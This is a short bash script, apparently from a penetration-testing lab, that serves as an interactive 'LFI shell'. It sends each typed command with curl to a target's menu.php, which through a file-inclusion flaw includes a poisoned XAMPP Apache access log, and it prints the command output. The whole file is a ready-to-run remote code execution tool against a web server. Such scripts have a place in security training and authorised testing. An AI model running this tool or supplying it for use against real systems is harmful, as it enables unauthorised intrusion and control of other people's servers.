#!/bin/bash

# Description: LFI shell using known LFI vulnerability and Log Poisoning to achieve arbitrary code execution

if [[ $# -lt 1 ]]; then
    echo "Usage: $(basename $0) IP"
fi

ip=$1
RED='\033[0;31m'
NC='\033[0m'

while true; do
    echo -ne "${RED}LFIsh>${NC} "
    read -r cmd

    if [[ ! -z "$cmd" ]]; then
        curl -G -s --data-urlencode "cmd=$cmd" "http://$ip/menu.php?file=C:\\xampp\\apache\\logs\\access.log" | awk '/<pre>/{flag=1;next}/<\/pre>/{flag=0}flag'
    fi
done
